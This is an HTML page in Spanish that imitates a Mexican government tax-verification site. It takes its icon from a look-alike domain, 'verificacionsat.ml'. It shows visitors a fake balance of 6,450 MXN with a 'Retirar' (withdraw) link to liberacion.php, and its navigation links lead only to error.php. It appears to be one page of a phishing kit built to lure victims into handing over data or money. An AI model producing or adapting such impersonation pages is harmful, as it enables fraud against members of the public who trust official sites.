<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<!---FAVICON-->
	<link rel="icon" type="image/x-icon" href="https://verificacionsat.ml/assets/images/sat.png">
	<!--STYLES-->
	<link rel="stylesheet" href="assets/styles.css">
	<link rel="stylesheet" href="assets/saldo.css">
	<!--FONTAWESOME-->
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<title>Verificación de Comprobantes Fiscales Digitales por internet</title>
</head>
<body ondragstart="return false;" ondrop="return false;">
	<div class="fixed">
		<nav class="navbar">
            <div class="navbar-header">
                <a href="#" class="navbar-brand"><img src="assets/renovacion.png" alt="Gobierno de México"></a>
                <button class="navbar-toggler"><span></span></button>
            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-concierge-bell"></i> Trámites</a>
                    </li>
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-address-card"></i> Nosotros</a>
                    </li>
                </ul>
            </div>
        </nav>
	</div>
	<!--WELCOME-->
	<div class="desing"></div>
	<div class="transport_web">
		<div class="info_web">
			<ul>
				<li><a href="https://www.gob.mx"><i class="fas fa-home"></i></a></li> /
				<li><a href="">Inicio</a></li>
			</ul>
		</div>
	</div>
	<!--END-->
	<div class="saldo">
		<div class="continuacion">
			<div class="text">
				Tu saldo actual es:
				<br>
				$ 6,450 MXN
				<br>
				<i class="fas fa-check-circle"></i>
				<br>
				<a href="liberacion.php">Retirar</a>
			</div>
		</div>
	</div>
	<script type="text/javascript">
        	const navbar = document.querySelector('.navbar');
const navbarToggler = navbar.querySelector('.navbar-header .navbar-toggler');
const navbarCollapse = navbar.querySelector('.navbar-collapse');
navbarToggler.addEventListener('click', function() {
    navbarToggler.classList.toggle('active');
    navbarCollapse.classList.toggle('active');
});
        </script>
</body>
</html>